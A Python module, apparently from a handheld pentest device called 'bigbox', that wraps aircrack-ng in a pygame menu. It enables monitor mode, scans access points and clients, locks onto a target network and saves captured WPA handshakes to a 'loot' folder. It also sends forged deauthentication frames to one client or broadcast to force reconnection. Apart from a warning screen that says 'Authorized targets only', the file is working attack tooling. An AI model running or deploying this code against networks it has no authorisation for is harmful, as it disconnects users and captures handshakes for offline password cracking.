"""Wi-Fi handshake capture + deauth — wraps the aircrack-ng suite.

Workflow:
  1. Pick a wlan interface that supports monitor mode.
  2. `airmon-ng start <iface>` -> <iface>mon.
  3. Continuous `airodump-ng --output-format csv` parsed live for AP list.
  4. Pick AP -> lock channel, show clients, write .pcap to loot/handshakes/.
  5. Optional `aireplay-ng --deauth` (confirmation required) to force a
     reconnect and trigger the 4-way handshake.
  6. Watch airodump stdout for "WPA handshake:" -> success indicator.
  7. On exit, kill child procs + `airmon-ng stop` to restore managed mode.

Bigbox runs as root on-device so no sudo is needed. In dev mode this view
will fail at airmon-ng with a permission error; that's expected.
"""
from __future__ import annotations

import csv
import os
import re
import signal
import subprocess
import threading
import time
from dataclasses import dataclass, field
from datetime import datetime
from pathlib import Path

import pygame

from bigbox import theme
from bigbox.events import Button, ButtonEvent
from bigbox.ui.section import SectionContext


PHASE_PICK_IFACE = "iface"
PHASE_ENABLING = "enabling"
PHASE_SCAN_APS = "scan"
PHASE_TARGET_AP = "target"
PHASE_CONFIRM_DEAUTH = "confirm"
PHASE_RESULT = "result"


@dataclass
class AP:
    bssid: str
    essid: str
    channel: str
    power: int
    privacy: str = ""

    @property
    def display(self) -> str:
        return self.essid or "<hidden>"


@dataclass
class Client:
    mac: str
    bssid: str
    power: int = 0
    probes: str = ""


@dataclass
class _Iface:
    name: str
    is_monitor: bool = False


def _list_wlan_ifaces() -> list[_Iface]:
    try:
        out = subprocess.check_output(["iw", "dev"], text=True, timeout=3)
    except Exception:
        return []
    ifaces: list[_Iface] = []
    cur_name: str | None = None
    cur_type: str = ""
    for line in out.splitlines():
        m = re.match(r"\s*Interface\s+(\S+)", line)
        if m:
            if cur_name is not None:
                ifaces.append(_Iface(cur_name, cur_type == "monitor"))
            cur_name = m.group(1)
            cur_type = ""
            continue
        m = re.match(r"\s*type\s+(\S+)", line)
        if m and cur_name is not None:
            cur_type = m.group(1)
    if cur_name is not None:
        ifaces.append(_Iface(cur_name, cur_type == "monitor"))
    return ifaces


def _read_airodump_csv(path: Path) -> tuple[list[AP], list[Client]]:
    """airodump-ng CSV: APs section, blank line, then Clients section."""
    aps: list[AP] = []
    clients: list[Client] = []
    if not path.exists():
        return aps, clients
    try:
        text = path.read_text(errors="replace")
    except Exception:
        return aps, clients

    # Split into two CSV sections.
    parts = re.split(r"\r?\n\r?\n", text, maxsplit=1)
    ap_block = parts[0]
    cli_block = parts[1] if len(parts) > 1 else ""

    for row in csv.reader(ap_block.splitlines()):
        if not row or row[0].strip() == "BSSID":
            continue
        if len(row) < 14:
            continue
        bssid = row[0].strip()
        if not re.match(r"^[0-9A-Fa-f:]{17}$", bssid):
            continue
        ch = row[3].strip()
        privacy = row[5].strip()
        try:
            power = int(row[8].strip() or "0")
        except ValueError:
            power = 0
        essid = row[13].strip().strip("\x00")
        aps.append(AP(bssid=bssid, essid=essid, channel=ch,
                      power=power, privacy=privacy))

    for row in csv.reader(cli_block.splitlines()):
        if not row or row[0].strip() == "Station MAC":
            continue
        if len(row) < 6:
            continue
        mac = row[0].strip()
        if not re.match(r"^[0-9A-Fa-f:]{17}$", mac):
            continue
        try:
            power = int(row[3].strip() or "0")
        except ValueError:
            power = 0
        bssid = row[5].strip()
        probes = (row[6].strip() if len(row) >= 7 else "")
        clients.append(Client(mac=mac, bssid=bssid, power=power, probes=probes))
    return aps, clients


class WifiAttackView:
    LOOT_DIR = Path("loot/handshakes")

    def __init__(self) -> None:
        self.dismissed = False
        self.phase = PHASE_PICK_IFACE
        self.status_msg = "Select monitor-capable adapter"

        self.ifaces = _list_wlan_ifaces()
        self.iface_cursor = 0
        self.mon_iface: str | None = None
        self.original_iface: str | None = None

        self.aps: list[AP] = []
        self.ap_cursor = 0
        self.ap_scroll = 0

        self.clients: list[Client] = []
        self.client_cursor = 0  # 0 = "[broadcast]"; >=1 = clients[i-1]
        self.targeted_ap: AP | None = None

        self.handshake_captured = False
        self.deauth_count = 0
        self.capture_prefix: Path | None = None
        self._capture_csv_path: Path | None = None

        self._airodump: subprocess.Popen | None = None
        self._airodump_thread: threading.Thread | None = None
        self._csv_poll_thread: threading.Thread | None = None
        self._stop = False

    # ---------- monitor mode lifecycle ----------
    def _enable_monitor(self, iface: str) -> bool:
        self.original_iface = iface
        self.phase = PHASE_ENABLING
        self.status_msg = f"airmon-ng start {iface}..."
        try:
            out = subprocess.run(
                ["airmon-ng", "start", iface],
                stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                text=True, timeout=15,
            )
        except FileNotFoundError:
            self.status_msg = "airmon-ng not installed"
            self.phase = PHASE_PICK_IFACE
            return False
        except subprocess.TimeoutExpired:
            self.status_msg = "airmon-ng timed out"
            self.phase = PHASE_PICK_IFACE
            return False
        # airmon-ng stdout includes "monitor mode vif enabled for [phyN]<iface> on [phyN]<iface>mon"
        m = re.search(r"monitor mode\s+vif enabled for[^\]]+\]\S+\s+on\s+\[(?:[^\]]+)\]?(\S+)",
                      out.stdout)
        if not m:
            # Older airmon-ng: "(monitor mode enabled on <iface>mon)"
            m = re.search(r"\(monitor mode enabled on (\S+?)\)", out.stdout)
        if m:
            self.mon_iface = m.group(1)
        else:
            # Fallback: scan iw dev for any "*mon" or new monitor interface.
            for it in _list_wlan_ifaces():
                if it.is_monitor:
                    self.mon_iface = it.name
                    break
        if not self.mon_iface:
            self.status_msg = "monitor mode failed (see iw dev)"
            self.phase = PHASE_PICK_IFACE
            return False
        return True

    def _disable_monitor(self) -> None:
        if not self.mon_iface:
            return
        try:
            subprocess.run(["airmon-ng", "stop", self.mon_iface],
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                           timeout=10)
        except Exception:
            pass
        self.mon_iface = None

    # ---------- airodump ----------
    def _start_airodump(self, ap: AP | None = None) -> None:
        self._stop_airodump()
        if not self.mon_iface:
            return

        self.LOOT_DIR.mkdir(parents=True, exist_ok=True)
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        if ap is None:
            prefix = self.LOOT_DIR / f"scan_{ts}"
            cmd = [
                "airodump-ng",
                "--output-format", "csv,pcap",
                "-w", str(prefix),
                self.mon_iface,
            ]
        else:
            safe_ssid = re.sub(r"[^A-Za-z0-9_-]", "_", ap.essid or "hidden")[:24]
            prefix = self.LOOT_DIR / f"{safe_ssid}_{ap.bssid.replace(':','')}_{ts}"
            cmd = [
                "airodump-ng",
                "-c", ap.channel or "1",
                "--bssid", ap.bssid,
                "--output-format", "csv,pcap",
                "-w", str(prefix),
                self.mon_iface,
            ]

        self.capture_prefix = prefix
        self._capture_csv_path = Path(str(prefix) + "-01.csv")
        self.handshake_captured = False
        self._stop = False

        try:
            self._airodump = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True,
                bufsize=1,
                preexec_fn=os.setsid,  # so we can SIGINT the whole group
            )
        except FileNotFoundError:
            self.status_msg = "airodump-ng not installed"
            return

        self._airodump_thread = threading.Thread(
            target=self._watch_airodump_stdout, daemon=True
        )
        self._airodump_thread.start()
        self._csv_poll_thread = threading.Thread(
            target=self._poll_csv, daemon=True
        )
        self._csv_poll_thread.start()

    def _stop_airodump(self) -> None:
        self._stop = True
        if self._airodump and self._airodump.poll() is None:
            try:
                os.killpg(os.getpgid(self._airodump.pid), signal.SIGINT)
                self._airodump.wait(timeout=3)
            except Exception:
                try:
                    self._airodump.kill()
                except Exception:
                    pass
        self._airodump = None

    def _watch_airodump_stdout(self) -> None:
        proc = self._airodump
        if not proc or not proc.stdout:
            return
        for line in proc.stdout:
            if self._stop:
                break
            if "WPA handshake" in line:
                self.handshake_captured = True
                self.status_msg = "HANDSHAKE CAPTURED"

    def _poll_csv(self) -> None:
        while not self._stop:
            if self._capture_csv_path:
                aps, clients = _read_airodump_csv(self._capture_csv_path)
                if aps:
                    # Sort by signal strength (closer = higher = more negative dBm)
                    aps.sort(key=lambda a: a.power, reverse=True)
                    self.aps = aps
                if self.targeted_ap:
                    self.clients = [c for c in clients
                                    if c.bssid.upper() == self.targeted_ap.bssid.upper()]
                else:
                    self.clients = clients
            time.sleep(1.0)

    # ---------- deauth ----------
    def _do_deauth(self) -> None:
        if not self.mon_iface or not self.targeted_ap:
            return
        cmd = [
            "aireplay-ng", "--deauth", "5",
            "-a", self.targeted_ap.bssid,
        ]
        if self.client_cursor > 0 and self.client_cursor - 1 < len(self.clients):
            cmd += ["-c", self.clients[self.client_cursor - 1].mac]
        cmd.append(self.mon_iface)

        def _worker():
            try:
                subprocess.run(cmd, stdout=subprocess.DEVNULL,
                               stderr=subprocess.DEVNULL, timeout=10)
                self.deauth_count += 1
                self.status_msg = f"Deauth sent ({self.deauth_count})"
            except FileNotFoundError:
                self.status_msg = "aireplay-ng not installed"
            except Exception as e:
                self.status_msg = f"deauth error: {type(e).__name__}"

        threading.Thread(target=_worker, daemon=True).start()

    # ---------- input ----------
    def handle(self, ev: ButtonEvent, ctx: SectionContext) -> None:
        if not ev.pressed:
            return

        if self.phase == PHASE_PICK_IFACE:
            if ev.button is Button.B:
                self.dismissed = True
            elif not self.ifaces:
                return
            elif ev.button is Button.UP:
                self.iface_cursor = (self.iface_cursor - 1) % len(self.ifaces)
            elif ev.button is Button.DOWN:
                self.iface_cursor = (self.iface_cursor + 1) % len(self.ifaces)
            elif ev.button is Button.A:
                pick = self.ifaces[self.iface_cursor]
                threading.Thread(target=self._enable_and_scan,
                                 args=(pick.name,), daemon=True).start()
            return

        if self.phase == PHASE_ENABLING:
            if ev.button is Button.B:
                self._cleanup_and_exit()
            return

        if self.phase == PHASE_SCAN_APS:
            if ev.button is Button.B:
                self._cleanup_and_exit()
            elif not self.aps:
                return
            elif ev.button is Button.UP:
                self.ap_cursor = (self.ap_cursor - 1) % len(self.aps)
                self._adjust_scroll()
            elif ev.button is Button.DOWN:
                self.ap_cursor = (self.ap_cursor + 1) % len(self.aps)
                self._adjust_scroll()
            elif ev.button is Button.A:
                self.targeted_ap = self.aps[self.ap_cursor]
                self.client_cursor = 0
                self.clients = []
                self.handshake_captured = False
                self.deauth_count = 0
                self.phase = PHASE_TARGET_AP
                self.status_msg = f"Locked on {self.targeted_ap.display}"
                # Restart airodump with bssid filter for handshake capture.
                self._start_airodump(self.targeted_ap)
            return

        if self.phase == PHASE_TARGET_AP:
            if ev.button is Button.B:
                # Back to AP scan
                self.targeted_ap = None
                self.clients = []
                self.phase = PHASE_SCAN_APS
                self.status_msg = "Scanning..."
                self._start_airodump(None)
            elif ev.button is Button.UP:
                total = len(self.clients) + 1  # +1 for [broadcast]
                self.client_cursor = (self.client_cursor - 1) % total
            elif ev.button is Button.DOWN:
                total = len(self.clients) + 1
                self.client_cursor = (self.client_cursor + 1) % total
            elif ev.button is Button.X:
                self.phase = PHASE_CONFIRM_DEAUTH
            return

        if self.phase == PHASE_CONFIRM_DEAUTH:
            if ev.button is Button.A:
                self._do_deauth()
                self.phase = PHASE_TARGET_AP
            elif ev.button is Button.B:
                self.phase = PHASE_TARGET_AP
            return

    def _enable_and_scan(self, iface: str) -> None:
        if not self._enable_monitor(iface):
            return
        self.phase = PHASE_SCAN_APS
        self.status_msg = f"Scanning on {self.mon_iface}..."
        self._start_airodump(None)

    def _cleanup_and_exit(self) -> None:
        self.status_msg = "Cleaning up..."
        self._stop_airodump()
        self._disable_monitor()
        self.dismissed = True

    def _adjust_scroll(self) -> None:
        visible = 8
        if self.ap_cursor < self.ap_scroll:
            self.ap_scroll = self.ap_cursor
        elif self.ap_cursor >= self.ap_scroll + visible:
            self.ap_scroll = self.ap_cursor - visible + 1

    # ---------- render ----------
    def render(self, surf: pygame.Surface) -> None:
        surf.fill(theme.BG)

        head_h = 44
        pygame.draw.rect(surf, theme.BG_ALT, (0, 0, theme.SCREEN_W, head_h))
        pygame.draw.line(surf, theme.ACCENT, (0, head_h - 1),
                         (theme.SCREEN_W, head_h - 1), 2)
        f_title = pygame.font.Font(None, 32)
        surf.blit(f_title.render("WIRELESS :: HANDSHAKE", True, theme.ACCENT),
                  (theme.PADDING, 8))

        foot_h = 32
        pygame.draw.rect(surf, (10, 10, 20),
                         (0, theme.SCREEN_H - foot_h, theme.SCREEN_W, foot_h))
        pygame.draw.line(surf, theme.DIVIDER,
                         (0, theme.SCREEN_H - foot_h),
                         (theme.SCREEN_W, theme.SCREEN_H - foot_h))
        f_small = pygame.font.Font(None, 20)
        col = theme.ACCENT if self.handshake_captured else theme.FG_DIM
        surf.blit(f_small.render(self.status_msg[:60], True, col),
                  (theme.PADDING, theme.SCREEN_H - foot_h + 8))
        hint = self._hint()
        hint_surf = f_small.render(hint, True, theme.FG_DIM)
        surf.blit(hint_surf,
                  (theme.SCREEN_W - hint_surf.get_width() - theme.PADDING,
                   theme.SCREEN_H - foot_h + 8))

        if self.phase == PHASE_PICK_IFACE:
            self._render_iface(surf, head_h)
        elif self.phase == PHASE_ENABLING:
            self._render_msg(surf, "Enabling monitor mode...")
        elif self.phase == PHASE_SCAN_APS:
            self._render_aps(surf, head_h, foot_h)
        elif self.phase == PHASE_TARGET_AP:
            self._render_target(surf, head_h, foot_h)
        elif self.phase == PHASE_CONFIRM_DEAUTH:
            self._render_confirm(surf)

    def _hint(self) -> str:
        if self.phase == PHASE_PICK_IFACE:
            return "A: Use  B: Back"
        if self.phase == PHASE_SCAN_APS:
            return "A: Target  B: Back"
        if self.phase == PHASE_TARGET_AP:
            return "X: Deauth  B: Back"
        if self.phase == PHASE_CONFIRM_DEAUTH:
            return "A: Yes  B: No"
        return "B: Back"

    def _render_iface(self, surf: pygame.Surface, head_h: int) -> None:
        f = pygame.font.Font(None, 32)
        f_small = pygame.font.Font(None, 22)
        title = f.render("Pick wireless adapter", True, theme.FG)
        surf.blit(title, (theme.SCREEN_W // 2 - title.get_width() // 2, head_h + 20))

        warn = f_small.render(
            "Adapter must support monitor mode (Alfa, etc.)",
            True, theme.FG_DIM)
        surf.blit(warn, (theme.SCREEN_W // 2 - warn.get_width() // 2, head_h + 60))

        if not self.ifaces:
            msg = f_small.render("No wlan interfaces found.", True, theme.ERR)
            surf.blit(msg, (theme.SCREEN_W // 2 - msg.get_width() // 2,
                            theme.SCREEN_H // 2))
            return

        list_y = head_h + 100
        for i, it in enumerate(self.ifaces):
            sel = i == self.iface_cursor
            rect = pygame.Rect(theme.SCREEN_W // 2 - 200, list_y + i * 50, 400, 44)
            if sel:
                pygame.draw.rect(surf, theme.SELECTION_BG, rect, border_radius=5)
                pygame.draw.rect(surf, theme.ACCENT, rect, 2, border_radius=5)
            color = theme.ACCENT if sel else theme.FG
            label = f.render(it.name, True, color)
            surf.blit(label, (rect.x + 14, rect.y + 8))
            tag = "monitor" if it.is_monitor else "managed"
            tag_surf = f_small.render(tag, True, theme.FG_DIM)
            surf.blit(tag_surf, (rect.right - tag_surf.get_width() - 14, rect.y + 14))

    def _render_msg(self, surf: pygame.Surface, msg: str) -> None:
        f = pygame.font.Font(None, 32)
        s = f.render(msg, True, theme.FG)
        surf.blit(s, (theme.SCREEN_W // 2 - s.get_width() // 2,
                      theme.SCREEN_H // 2 - 16))

    def _render_aps(self, surf: pygame.Surface, head_h: int, foot_h: int) -> None:
        if not self.aps:
            self._render_msg(surf, "Listening for beacons...")
            return

        list_x = theme.PADDING
        list_y = head_h + 8
        list_w = theme.SCREEN_W - 2 * theme.PADDING
        list_h = theme.SCREEN_H - head_h - foot_h - 16
        pygame.draw.rect(surf, (5, 5, 10), (list_x, list_y, list_w, list_h))
        pygame.draw.rect(surf, theme.DIVIDER, (list_x, list_y, list_w, list_h), 1)

        row_h = 44
        f_main = pygame.font.Font(None, 24)
        f_meta = pygame.font.Font(None, 18)
        visible = list_h // row_h

        for i in range(visible):
            idx = self.ap_scroll + i
            if idx >= len(self.aps):
                break
            ap = self.aps[idx]
            y = list_y + i * row_h
            rect = pygame.Rect(list_x + 1, y + 1, list_w - 2, row_h - 2)
            if idx == self.ap_cursor:
                pygame.draw.rect(surf, theme.SELECTION_BG, rect)
                pygame.draw.rect(surf, theme.ACCENT, rect, 2)
                color = theme.ACCENT
            else:
                color = theme.FG
            label = f_main.render(f"{ap.display}", True, color)
            surf.blit(label, (rect.x + 10, rect.y + 4))
            meta = f"{ap.bssid}  ch{ap.channel}  {ap.power}dBm  {ap.privacy}"
            ms = f_meta.render(meta, True, theme.FG_DIM)
            surf.blit(ms, (rect.x + 10, rect.y + 24))

        if len(self.aps) > visible:
            bar_x = list_x + list_w - 4
            thumb_h = max(20, int(list_h * visible / len(self.aps)))
            thumb_y = list_y + int(list_h * self.ap_scroll / len(self.aps))
            pygame.draw.rect(surf, theme.DIVIDER, (bar_x, list_y, 3, list_h))
            pygame.draw.rect(surf, theme.ACCENT, (bar_x, thumb_y, 3, thumb_h))

    def _render_target(self, surf: pygame.Surface, head_h: int, foot_h: int) -> None:
        ap = self.targeted_ap
        if not ap:
            return
        f_big = pygame.font.Font(None, 28)
        f_small = pygame.font.Font(None, 20)

        # AP banner
        banner_y = head_h + 10
        banner = f_big.render(ap.display, True, theme.ACCENT)
        surf.blit(banner, (theme.PADDING, banner_y))
        sub = f_small.render(f"{ap.bssid}  ch{ap.channel}  {ap.privacy}",
                             True, theme.FG_DIM)
        surf.blit(sub, (theme.PADDING, banner_y + 28))

        # Handshake indicator
        ind_x = theme.SCREEN_W - 220
        col = theme.ACCENT if self.handshake_captured else theme.WARN
        pygame.draw.circle(surf, col, (ind_x, banner_y + 14), 10)
        label = "HANDSHAKE OK" if self.handshake_captured else "WAITING..."
        l_surf = f_small.render(label, True, col)
        surf.blit(l_surf, (ind_x + 18, banner_y + 6))
        d_surf = f_small.render(f"deauth: {self.deauth_count}",
                                True, theme.FG_DIM)
        surf.blit(d_surf, (ind_x + 18, banner_y + 28))

        # Clients list
        list_x = theme.PADDING
        list_y = banner_y + 60
        list_w = theme.SCREEN_W - 2 * theme.PADDING
        list_h = theme.SCREEN_H - list_y - foot_h - 16
        pygame.draw.rect(surf, (5, 5, 10), (list_x, list_y, list_w, list_h))
        pygame.draw.rect(surf, theme.DIVIDER, (list_x, list_y, list_w, list_h), 1)

        # Row 0 = "[broadcast]"
        row_h = 32
        rows = [("[broadcast deauth]", "")] + [
            (c.mac, f"{c.power}dBm  probes:{c.probes[:30]}") for c in self.clients
        ]
        f_main = pygame.font.Font(None, 22)
        for i, (label, meta) in enumerate(rows):
            y = list_y + i * row_h
            if y + row_h > list_y + list_h:
                break
            rect = pygame.Rect(list_x + 1, y + 1, list_w - 2, row_h - 2)
            if i == self.client_cursor:
                pygame.draw.rect(surf, theme.SELECTION_BG, rect)
                pygame.draw.rect(surf, theme.ACCENT, rect, 2)
                color = theme.ACCENT
            else:
                color = theme.FG
            ls = f_main.render(label, True, color)
            surf.blit(ls, (rect.x + 10, rect.y + 4))
            if meta:
                ms = f_small.render(meta, True, theme.FG_DIM)
                surf.blit(ms, (rect.right - ms.get_width() - 10, rect.y + 8))

    def _render_confirm(self, surf: pygame.Surface) -> None:
        # Modal box
        box_w, box_h = 540, 200
        bx = (theme.SCREEN_W - box_w) // 2
        by = (theme.SCREEN_H - box_h) // 2
        overlay = pygame.Surface((theme.SCREEN_W, theme.SCREEN_H), pygame.SRCALPHA)
        overlay.fill((0, 0, 0, 200))
        surf.blit(overlay, (0, 0))
        pygame.draw.rect(surf, theme.BG, (bx, by, box_w, box_h), border_radius=10)
        pygame.draw.rect(surf, theme.ERR, (bx, by, box_w, box_h), 2, border_radius=10)

        f_title = pygame.font.Font(None, 30)
        f_body = pygame.font.Font(None, 22)
        title = f_title.render("CONFIRM DEAUTH", True, theme.ERR)
        surf.blit(title, (bx + box_w // 2 - title.get_width() // 2, by + 16))

        msgs = [
            "Authorized targets only.",
            "Sending forged 802.11 deauth frames is illegal",
            "on networks you do not own or have permission",
            "to test.",
        ]
        for i, msg in enumerate(msgs):
            ms = f_body.render(msg, True, theme.FG_DIM)
            surf.blit(ms, (bx + 24, by + 60 + i * 24))

        prompt = f_body.render("A: Send  B: Cancel", True, theme.ACCENT)
        surf.blit(prompt, (bx + box_w // 2 - prompt.get_width() // 2,
                           by + box_h - 32))
